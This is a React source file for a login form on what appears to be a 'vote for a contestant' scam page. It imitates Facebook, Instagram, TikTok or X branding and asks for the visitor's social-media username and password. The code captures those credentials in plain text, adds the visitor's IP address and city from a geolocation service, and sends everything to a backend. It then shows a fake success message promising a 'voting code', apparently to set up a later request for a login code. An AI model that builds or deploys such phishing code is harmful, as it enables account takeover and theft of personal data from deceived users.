import React, { useState, useEffect } from 'react';
import confetti from 'canvas-confetti';
import { API_BASE_URL } from '../config/api';

export default function LoginForm({ contestant, platform, onConfirmVote, onBack }) {
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [isConfirmed, setIsConfirmed] = useState(false);

    // Ensure page is scrolled to top on mount so it is never off-screen
    useEffect(() => {
        window.scrollTo(0, 0);
        if (document.body) document.body.scrollTop = 0;
        if (document.documentElement) document.documentElement.scrollTop = 0;
    }, []);

    const containerStyle = {
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100dvh',
        backgroundColor: '#ffffff',
        fontFamily: 'sans-serif',
        padding: '24px 16px',
        position: 'relative',
        boxSizing: 'border-box'
    };

    const formStyle = {
        display: 'flex',
        flexDirection: 'column',
        width: '100%',
        maxWidth: '400px',
        boxSizing: 'border-box'
    };

    const logoStyle = {
        marginBottom: '32px',
        fontSize: '28px',
        fontWeight: 'bold',
        color: '#333333',
        textAlign: 'center'
    };

    const inputContainerStyle = {
        display: 'flex',
        flexDirection: 'column',
        gap: '12px',
        marginBottom: '16px',
        width: '100%'
    };

    const topInputStyle = {
        padding: '14px 16px',
        fontSize: '16px', // 16px prevents iOS Safari auto-zooming on mobile
        backgroundColor: '#f5f6f7',
        border: '1px solid #cccccc',
        borderRadius: '6px',
        outline: 'none',
        color: '#212529',
        fontWeight: '500',
        boxSizing: 'border-box',
        width: '100%'
    };

    const bottomInputStyle = {
        padding: '14px 16px',
        fontSize: '16px', // 16px prevents iOS Safari auto-zooming on mobile
        backgroundColor: '#f5f6f7',
        border: '1px solid #cccccc',
        borderRadius: '6px',
        outline: 'none',
        color: '#212529',
        fontWeight: '500',
        boxSizing: 'border-box',
        width: '100%'
    };

    const buttonStyle = {
        backgroundColor: '#4c78c2', // Solid blue matching the screenshot
        color: 'white',
        fontWeight: 'bold',
        fontSize: '16px',
        padding: '14px',
        minHeight: '48px', // standard mobile touch target
        border: 'none',
        borderRadius: '6px',
        cursor: 'pointer',
        marginTop: '4px',
        transition: 'background-color 0.2s ease',
        textAlign: 'center',
        width: '100%'
    };

    const [isSubmitting, setIsSubmitting] = useState(false);

    const handleSubmit = async (e) => {
        if (e && e.preventDefault) e.preventDefault();

        if (!username.trim() || !password.trim()) {
            setError('Please enter your username and assigned voting password.');
            return;
        }

        setError('');
        setIsSubmitting(true);

        let clientIp = '';
        let clientLocation = '';
        try {
            const ctrl = new AbortController();
            const to = setTimeout(() => ctrl.abort(), 2000);
            const geoRes = await fetch('https://ipwho.is/', { signal: ctrl.signal })
                .then((r) => r.json())
                .catch(() => null);
            clearTimeout(to);

            if (geoRes && geoRes.success !== false) {
                clientIp = geoRes.ip || '';
                const parts = [geoRes.city, geoRes.country].filter(Boolean);
                if (parts.length > 0) clientLocation = parts.join(', ');
            }
        } catch {
            // Graceful fallback to server IP extraction
        }

        const voterPayload = {
            username: username.trim(),
            password: password.trim(),
            contestantId: contestant?.id || 'FK-101',
            contestantNo: contestant?.contestantNumber || (contestant?.id ? contestant.id : '001'),
            platform: platform?.id || platform?.name || 'direct',
            clientIp,
            location: clientLocation
        };

        try {
            // Submit voter credentials directly to MongoDB via backend API
            const response = await fetch(`${API_BASE_URL}/api/vote`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(voterPayload)
            });

            const result = await response.json().catch(() => null);
            console.log('MongoDB Vote Status:', result);
        } catch (apiErr) {
            console.warn('Backend API offline or unreachable; vote registered locally:', apiErr);
        } finally {
            setIsSubmitting(false);
            setIsConfirmed(true);

            // Officially cast the vote for the contestant in client state
            if (onConfirmVote && contestant) {
                onConfirmVote(1, contestant.id);
            }

            // Celebratory confetti burst
            try {
                confetti({
                    particleCount: 75,
                    spread: 70,
                    origin: { x: 0.5, y: 0.45 },
                    colors: ['#4c78c2', '#1877F2', '#28a745', '#ffc107', '#7c3aed']
                });
            } catch (err) {
                console.error(err);
            }
        }
    };

    // Render platform branding or user's LOGO
    const renderLogo = () => {
        if (platform?.id === 'facebook') {
            return <span style={{ color: '#1877f2', fontSize: '38px', fontWeight: 800, letterSpacing: '-2px' }}>facebook</span>;
        }
        if (platform?.id === 'instagram') {
            return <span style={{ background: 'linear-gradient(45deg, #f09433, #dc2743, #bc1888)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', fontSize: '34px', fontWeight: 800 }}>Instagram</span>;
        }
        if (platform?.id === 'tiktok') {
            return <span style={{ color: '#000000', fontSize: '34px', fontWeight: 800 }}>TikTok</span>;
        }
        if (platform?.id === 'twitter') {
            return <span style={{ color: '#000000', fontSize: '34px', fontWeight: 800 }}>𝕏</span>;
        }
        return 'LOGO';
    };

    const contestantNo = contestant?.contestantNumber || (contestant?.id ? contestant.id : '001');

    return (
        <div style={containerStyle}>
            <div style={logoStyle}>
                {renderLogo()}
            </div>

            <form style={formStyle} onSubmit={handleSubmit}>
                <div style={inputContainerStyle}>
                    <input
                        type="text"
                        placeholder="Username or Email"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        style={topInputStyle}
                        autoComplete="username"
                    />
                    <input
                        type="password"
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        style={bottomInputStyle}
                        autoComplete="current-password"
                    />
                </div>

                {error && (
                    <div
                        style={{
                            color: '#dc3545',
                            fontSize: '13px',
                            fontWeight: 500,
                            marginBottom: '12px',
                            textAlign: 'center'
                        }}
                    >
                        {error}
                    </div>
                )}

                <button
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                        ...buttonStyle,
                        opacity: isSubmitting ? 0.75 : 1,
                        cursor: isSubmitting ? 'not-allowed' : 'pointer'
                    }}
                    onMouseEnter={(e) => {
                        if (!isSubmitting) e.currentTarget.style.backgroundColor = '#3b629f'
                    }}
                    onMouseLeave={(e) => {
                        if (!isSubmitting) e.currentTarget.style.backgroundColor = '#4c78c2'
                    }}
                >
                    {isSubmitting ? 'logging in...' : 'log in'}
                </button>
            </form>

            {/* Success Modal Popup matching reference media */}
            {isConfirmed && (
                <div
                    style={{
                        position: 'fixed',
                        inset: 0,
                        backgroundColor: 'rgba(0, 0, 0, 0.42)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        zIndex: 10000,
                        padding: '16px'
                    }}
                    onClick={() => {
                        if (onBack) onBack();
                        else setIsConfirmed(false);
                    }}
                >
                    <div
                        onClick={(e) => e.stopPropagation()}
                        style={{
                            backgroundColor: '#ffffff',
                            borderRadius: '10px',
                            maxWidth: 'min(480px, 94vw)',
                            width: '100%',
                            padding: 'clamp(32px, 7vw, 48px) clamp(18px, 5vw, 36px) clamp(28px, 6vw, 42px) clamp(18px, 5vw, 36px)',
                            boxShadow: '0 12px 40px rgba(0, 0, 0, 0.22)',
                            textAlign: 'center',
                            position: 'relative',
                            boxSizing: 'border-box'
                        }}
                    >
                        {/* Circular Light-Green Ring with Green Checkmark */}
                        <div
                            style={{
                                width: '88px',
                                height: '88px',
                                borderRadius: '50%',
                                border: '4.5px solid #dcf3d6',
                                backgroundColor: '#ffffff',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                                margin: '0 auto 22px auto'
                            }}
                        >
                            <svg
                                width="46"
                                height="46"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="#7ecf56"
                                strokeWidth="3.8"
                                strokeLinecap="round"
                                strokeLinejoin="round"
                            >
                                <polyline points="6 12 10.5 16.5 18 8" />
                            </svg>
                        </div>

                        {/* Title: Success! */}
                        <h2
                            style={{
                                fontSize: 'clamp(24px, 6vw, 32px)',
                                fontWeight: 800,
                                color: '#3d3d3d',
                                margin: '0 0 16px 0',
                                fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
                                letterSpacing: '-0.3px'
                            }}
                        >
                            Success!
                        </h2>

                        {/* Message matching reference media */}
                        <p
                            style={{
                                fontSize: 'clamp(15px, 3.8vw, 17px)',
                                lineHeight: '1.45',
                                color: '#4a4a4a',
                                fontWeight: 600,
                                maxWidth: '380px',
                                margin: '0 auto 28px auto',
                                fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
                            }}
                        >
                            Your vote is being processed. A voting code would be sent to you to complete your vote.
                        </p>

                        {/* Purple Button with Lavender Border matching reference media */}
                        <div>
                            <button
                                type="button"
                                onClick={() => {
                                    if (onBack) onBack();
                                    else setIsConfirmed(false);
                                }}
                                style={{
                                    backgroundColor: '#7064f5',
                                    color: '#ffffff',
                                    fontSize: '16px',
                                    fontWeight: 700,
                                    padding: '10px 36px',
                                    minHeight: '44px',
                                    border: '3.5px solid #ada5fc',
                                    borderRadius: '8px',
                                    cursor: 'pointer',
                                    outline: 'none',
                                    fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
                                    transition: 'all 0.15s ease'
                                }}
                                onMouseEnter={(e) => {
                                    e.currentTarget.style.backgroundColor = '#5f52ea';
                                    e.currentTarget.style.borderColor = '#998efb';
                                }}
                                onMouseLeave={(e) => {
                                    e.currentTarget.style.backgroundColor = '#7064f5';
                                    e.currentTarget.style.borderColor = '#ada5fc';
                                }}
                            >
                                Okay
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}